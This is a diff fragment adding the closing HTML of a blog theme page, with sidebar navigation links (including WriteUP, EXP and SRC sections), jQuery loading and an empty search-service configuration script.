+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
